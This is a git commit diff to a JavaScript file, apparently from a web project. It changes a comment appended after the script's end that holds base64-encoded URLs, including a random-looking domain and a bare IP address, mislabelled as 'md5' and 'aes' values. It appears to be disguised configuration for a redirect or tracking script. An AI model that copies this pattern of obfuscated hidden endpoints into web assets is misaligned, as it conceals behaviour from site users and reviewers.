618a8e17c6c375b1e98ba2b6e26bfcd568a3d484
caocaodage <caocaodajun@gmail.com>
2023-02-07 09:30:03 +0800

    init

--- js/icon_9tradr.js
+++ js/icon_9tradr.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cuYmdua21zbW1kbnR3LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
